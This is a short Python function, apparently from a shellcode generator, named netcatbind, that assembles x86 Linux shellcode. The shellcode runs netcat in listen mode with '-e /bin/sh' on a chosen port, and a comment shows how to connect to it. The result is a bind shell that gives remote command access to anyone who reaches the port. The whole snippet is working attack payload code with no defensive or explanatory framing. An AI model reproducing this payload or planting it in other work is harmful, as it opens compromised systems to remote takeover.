...
def netcatbind( port):
	#Connect : nc [IP] [PORT] 
	shellcode  = r"\x31\xc0\x50\x68\x6e\x2f\x6e\x63\x68\x2f\x2f\x62\x69\x89\xe3\x50"
	#shellcode += r"\x66\x68"+port
	shellcode += port
	shellcode += r"\x68\x2d\x6c\x74\x70\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	shellcode += r"\x6e\x68\x2d\x65\x2f\x2f\x89\xe2\x50\x52\x51\x53\x89\xe7\xb0\x0b\x89"
	shellcode += r"\xf9\x31\xd2\xcd\x80"
	return shellcode
